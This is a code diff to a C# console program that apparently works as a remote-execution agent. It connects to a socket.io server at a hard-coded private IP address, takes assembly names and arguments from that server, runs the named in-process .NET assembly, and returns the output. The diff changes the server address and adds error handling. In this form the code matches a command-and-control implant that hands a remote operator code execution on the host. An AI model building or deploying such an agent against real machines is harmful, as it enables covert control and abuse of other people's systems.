@@ -34,7 +34,7 @@ namespace ConsoleApp1
             }
             while (true) { };
         }
-        static async void Go(string home = "http://192.168.1.8:8888/")
+        static async void Go(string home = "http://192.168.1.14:8888/")
         {
             // create new socket.io client
             var client = new SocketIO(home);
@@ -94,21 +94,37 @@ namespace ConsoleApp1
         }
         static void RunAndReturn(SocketIO client, SocketIOResponse response)
         {
-            // Wrapper to run "Invoke" in a thread and return data to server
+            // Wrapper to run "Invoke" in a thread and send data to server
             string[] args = response.GetValue<string[]>();
             string assemblyName = args[0];
             string[] assemblyArgs = args.Skip(1).Take(args.Length).ToArray(); // args[1:]
+            int returnType;
+            string output;
 
             // do the thing
-            (int returnType, string content) = Invoke(assemblyName, assemblyArgs);
-            client.EmitAsync("echo", new { returnType, content });
+            try
+            {
+                (returnType, output) = Invoke(assemblyName, assemblyArgs);
+            }
+            catch (Exception e)
+            {
+                returnType = 0;
+                output = "Error executing assembly " + assemblyName + ":\n" + e.ToString();
+            }
+            client.EmitAsync("echo", new { returnType, output });
         }
         static (int, string) Invoke(string assemblyName, string[] args, string methodName = "Main")
         {
             Assembly GetAssemblyByName(string name)
             {
-                return AppDomain.CurrentDomain.GetAssemblies().
-                       FirstOrDefault(_ => _.GetName().Name == name);
+                try
+                {
+                    return AppDomain.CurrentDomain.GetAssemblies().First(_ => _.GetName().Name == name);
+                }
+                catch
+                {
+                    throw new Exception("Assembly " + name + " is not loaded into the process");
+                }
             }
 
             Assembly assembly = GetAssemblyByName(assemblyName);
